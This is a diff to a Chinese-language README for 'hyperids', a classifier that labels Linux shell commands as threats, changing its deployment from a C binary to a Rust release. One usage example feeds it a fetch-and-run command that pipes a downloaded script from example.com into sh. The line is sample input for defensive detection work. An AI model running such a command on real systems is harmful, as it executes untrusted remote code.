@@ -12,7 +12,7 @@ Linux shell 命令威胁分类器。给定一条 shell 命令，输出：
 ```
 hyperids/        核心包：schema / 训练 / 评估 / 推理 / 数据构建 / 公共客户端
   data/          上游数据准备（拉取 / 合成 / 打标，可选重跑）
-deploy/          部署：ONNX 导出 / INT8 量化 / C 单二进制（c_runtime/）
+deploy/          部署：ONNX 导出 / INT8 量化 / Rust 单文件发布版
 tools/           工具：bench / 外部评测 / schema 校验
 docs/            文档：模型卡 / 训练链路 / 数据链路 / 进度 / 外部评测
 dataset/         数据：corpus（LFS 同步）+ external_eval + 训练集分片
@@ -41,7 +41,7 @@ hyperids 'curl -s http://example.com/x.sh | sh'
 ```
 
 支持 macOS x86_64/aarch64 与 Linux x86_64/aarch64。详见 `deploy/ort_rust_demo/README.md`。
-旧 C 运行时保留在 `deploy/c_runtime/`（legacy）。
+
 
 ## MITRE ATT&CK 覆盖
 
